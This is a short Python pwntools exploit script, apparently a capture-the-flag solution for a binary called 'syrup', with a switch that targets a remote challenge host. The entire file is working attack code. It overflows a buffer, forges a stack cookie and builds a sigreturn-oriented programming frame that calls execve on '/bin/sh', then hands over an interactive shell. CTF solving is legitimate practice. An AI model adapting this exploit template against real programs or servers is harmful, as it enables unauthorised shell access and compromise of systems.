#!/usr/bin/python3

from pwn import *

context.terminal = ['tmux', 'split', '-h']
context.arch = 'amd64'

bin_sh_addr = 0x40103a
syscall_addr = 0x40100f

elf = ELF('syrup')

if args.REMOTE:
    p = remote('jh2i.com', 50036)
else:
    p = process(elf.path)

    if args.GDB:
        gdb.attach(p, '''
            break * 0x401081
            continue
            ''')

padding = b'A' * 0x400
cookie = p64(0xdead ^ 0xbeef)
srop_code = p64(constants.SYS_rt_sigreturn)
rip_addr = p64(elf.sym.fn2)

frame = SigreturnFrame()
frame.rip = syscall_addr
frame.rax = constants.SYS_execve
frame.rdi = bin_sh_addr
frame.rsi = 0
frame.rdx = 0
frame.rsp = 0x402800

payload = padding + cookie + srop_code + rip_addr + bytes(frame)

log.info(f'payload = {payload}')

p.recvuntil(b'?\n')

p.send(payload)

p.interactive()
